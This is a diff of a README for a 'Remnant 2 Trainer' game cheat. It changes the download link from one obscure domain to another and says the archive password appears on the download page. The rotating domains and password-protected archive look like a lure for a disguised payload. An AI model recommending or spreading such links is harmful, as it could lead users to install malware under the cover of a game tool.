@@ -18,7 +18,7 @@ Remnant 2 Trainer - game hack and trainer with full feature set. Works with the 
 
 ## Download
 
-[![Download v2.2.0](https://img.shields.io/badge/Download_v2.2.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/remnant2tr)
+[![Download v2.2.0](https://img.shields.io/badge/Download_v2.2.0-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/remnant2tr)
 
 > The archive password is shown on the download page.
 
